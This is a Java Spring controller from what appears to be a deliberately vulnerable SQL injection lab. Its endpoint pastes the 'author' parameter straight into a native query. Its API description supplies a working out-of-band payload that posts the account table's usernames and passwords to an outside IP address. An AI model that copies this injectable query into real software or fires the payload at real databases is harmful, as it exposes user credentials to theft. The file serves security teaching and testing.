package net.vinpos.api.sqli;

import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import jakarta.persistence.EntityManager;
import jakarta.persistence.PersistenceContext;
import jakarta.persistence.Query;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.List;

@Tag(name = "Out-of-band SQLi")
@RestController
@RequiredArgsConstructor
@RequestMapping("/sqli")
public class OutOfBandSQLiController {

  @PersistenceContext private final EntityManager entityManager;

  /**
   * Boolean-based SQL Injection
   *
   * @param author
   * @return
   */
  @GetMapping("/vulnerable/out-of-band/books")
  @Operation(
      summary = "Out of band SQL injection",
      description = "Input this to param: ' OR EXISTS (SELECT 1 FROM http_post('http://10.117.10.87:8000/',(SELECT json_agg(json_build_object('id', id, 'username', username, 'password', password)) FROM account)::text, 'application/json') AS response WHERE response.status BETWEEN 200 AND 299); --")
  public ResponseEntity<?> vulnerableOutOfBandGetBook(@RequestParam String author) {
    String sql = String.format("SELECT * FROM book where author = '%s'", author);
    Query query = entityManager.createNativeQuery(sql, Book.class);
    List<Book> books = query.getResultList();
    return ResponseEntity.ok(books);
  }
}
